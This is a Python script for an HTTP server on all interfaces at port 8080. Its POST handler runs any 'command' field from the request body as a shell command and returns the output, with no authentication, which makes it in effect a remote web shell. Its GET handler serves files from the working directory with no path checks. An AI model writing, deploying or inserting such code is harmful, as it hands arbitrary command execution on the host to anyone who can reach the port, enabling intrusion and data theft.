import os
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class CommandHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        
        if self.path.endswith('.html'):
            with open(os.path.join(os.getcwd(), self.path[1:]), 'rb') as f:
                content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Content-Length', len(content))
                self.end_headers()
                self.wfile.write(content)
        
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        request = json.loads(body.decode('utf-8'))
        command = request['command']

        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout.decode('utf-8')
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', len(output))
        self.end_headers()
        self.wfile.write(output.encode('utf-8'))

def run_command_server(host, port):
    httpd = HTTPServer((host, port), CommandHandler)
    print(f'Running server on {host}:{port}')
    httpd.serve_forever()

run_command_server("0.0.0.0", 8080)
